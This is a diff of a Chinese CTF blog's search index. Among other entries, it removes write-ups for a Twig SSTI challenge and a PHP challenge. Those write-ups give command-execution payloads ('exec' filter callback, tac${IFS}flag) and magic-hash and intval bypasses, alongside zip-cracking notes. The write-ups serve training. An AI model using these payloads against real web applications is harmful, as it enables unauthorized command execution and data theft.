+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
+
+<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>misc笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于TCP与UDP协议的学习</title>
     <url>/2022/06/19/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>TCP协议的**<em>*<em>三次握手，传输确认，四次挥手*</em>*</em>*</p>
@@ -1271,54 +1624,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
-    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
-<p>首先打开虚拟机，选择新建</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
-
-<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
-
-<p>在这里需要创建虚拟硬盘，下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
-
-<p>直接下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
-
-<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
-<p>再点击刚刚创建的虚拟机的设置</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
-
-<p>点击储存</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
-
-<p>点击左下方的加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
-
-<p>点击软盘，它就会多出了一个控制器</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
-
-<p>点击右方加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
-
-<p>点击注册</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
-
-<p>将自己的软盘放进去，点击ok保存就好</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
-
-<p>最后将虚拟机启动就可以了</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>其它笔记</category>
-      </categories>
-      <tags>
-        <tag>其它</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>国赛 misc ez_usb</title>
     <url>/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc%20ez_usb/</url>
     <content><![CDATA[<p>下载附件，发现是usb的流量分析</p>
@@ -1354,7 +1659,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#x77;&#x61;&#x6e;&#x67;&#121;&#x69;&#x68;&#97;&#110;&#x67;&#101;&#x72;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x77;&#x61;&#x6e;&#x67;&#121;&#x69;&#x68;&#97;&#110;&#x67;&#101;&#x72;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#x77;&#97;&#110;&#103;&#x79;&#105;&#x68;&#97;&#x6e;&#x67;&#101;&#114;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#x77;&#97;&#110;&#103;&#x79;&#105;&#x68;&#97;&#x6e;&#x67;&#101;&#114;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
@@ -1785,165 +2090,6 @@
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF [BJDCTF2020]Cookie is so stable</title>
-    <url>/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/</url>
-    <content><![CDATA[<h1 id="BUUCTF-BJDCTF2020-Cookie-is-so-stable"><a href="#BUUCTF-BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BUUCTF [BJDCTF2020]Cookie is so stable"></a>BUUCTF [BJDCTF2020]Cookie is so stable</h1><p><strong>这是一道关于php的SSTI注入</strong></p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175404154.png" class="" title="image-20220811175404154">
-
-<p>这是检测ssti的一张思路图看不懂的小伙伴后面会有详解不要慌张；</p>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>从题目看出这题应该解题的关键在于cookie</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175546406.png" class="" title="image-20220811175546406">
-
-<p>查看提示（hint下f12）</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175641303.png" class="" title="image-20220811175641303">
-
-<p>用bp抓包查看，发现在输入id登陆后cookie中出现了一个可控变量user</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175951417.png" class="" title="image-20220811175951417">
-
-<p>所以猜想后端接受到user输入后在进行输出类似一个模板所以想到了ssti注入（非官方思路猜想）</p>
-<p>之后根据测试图测试发现是Twig模板</p>
-<p>payload：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180220745.png" class="" title="image-20220811180220745">
-
-
-
-
-
-
-
-
-
-<h1 id="关于模板判断的方法及回显"><a href="#关于模板判断的方法及回显" class="headerlink" title="关于模板判断的方法及回显"></a>关于模板判断的方法及回显</h1><p>首先利用${7*7}进行测试，我们发现在页面上未进行一个算数运算，所以往下走</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180358818.png" class="" title="image-20220811180358818">
-
-<p>利用49测试</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180633572.png" class="" title="image-20220811180633572">
-
-<p>发现这里发生了运算，也就是图中下路中间部分的情况，这时候就要判断它是twig，还是jinja2</p>
-<p>也就是利用49</p>
-<p>如果是twig则返回结果应该是计算后的结果，反之亦然；</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180341890.png" class="" title="image-20220811180341890">
-
-<p>jinja2下测试49回显如下</p>
-<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811181059123.png" class="" title="image-20220811181059123">
-
-<p>（场景来源bugku-Simple_SSTI_1）</p>
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>web题集</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>各种压缩包的加密</title>
-    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
-<p>第一个a.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
-
-<p>看了下有三个文件，1.txt，2.txt</p>
-<p>按照套路应该是CRC32爆破没错了，试试看</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
-
-<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
-<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
-<p>第二个f.zip</p>
-<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
-
-<p>五位数字爆破成功密码是61825</p>
-<p>第三个g.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
-
-<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
-<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
-
-<p>进行明文爆破，成功</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
-
-<p>第四个压缩包l.zip</p>
-<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
-
-<p>能够解压</p>
-<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
-
-<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>misc笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF [WUSTCTF2020]朴实无华</title>
-    <url>/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
-    <content><![CDATA[<p>进入题目，发现有乱码问题</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223043353.png" class="" title="image-20220812223043353">
-
-<p>解决后发现这串字符的中文是“人间极乐bot”</p>
-<p>（一开始以为是.git泄露扫了半天啥也不是555）</p>
-<p>bot想到了robots.txt所以进行了尝试</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223221029.png" class="" title="image-20220812223221029">
-
-<p>根据提示继续访问，可却得到的是flag{this_is_not_flag}</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223408944.png" class="" title="image-20220812223408944">
-
-<p>回想刚才的robots.txt页面显示是一个header果断（大佬提示）bp抓包观察</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223544964.png" class="" title="image-20220812223544964">
-
-<p>果然有所收获访问一下看看</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223925726.png" class="" title="image-20220812223925726">
-
-<p>又有乱码问题不过不重要，关键的代码没乱就行，大体可以看出有三关，接下来进入主菜我们一步一步分析</p>
-<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>payload：?num&#x3D;11e3</p>
-<p>第一关的考点是强制类型转换的利用（个人认为）</p>
-<p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值</p>
-<p>​           在这里存在一个问题即利用科学记数法时如果没有计算则进行强制类型转换否则先计算在提取；</p>
-<p>eg：intval(11e3)输出&#x3D;&#x3D;》11 </p>
-<p>​		intval(11e3+1)输出&#x3D;&#x3D;》11001</p>
-<p>这样就能绕过intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>payload：md5&#x3D;0e215962017</p>
-<p>第二部分考md5目的是加密前后的值“&#x3D;&#x3D;”相等</p>
-<p>一开始以为是数组绕过尝试后发现不行，所以使用经过查找发现md5值为0e215962017时加密前后值相等（都是0）</p>
-<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>payload: get_flag&#x3D;tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>
-<p>最后一步命令执行；但是不能使用cat和空格，</p>
-<p>当然能查看的命令有很多eg：tac，more，less，nl，vi，vim等这里就不一一列举</p>
-<p>空格可以用${IFS}绕过</p>
-<p>先利用ls指令查出flag所在的位置</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230018477.png" class="" title="image-20220812230018477">
-
-<p>之后便可查到flag了</p>
-<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230059556.png" class="" title="image-20220812230059556">
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>web题集</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
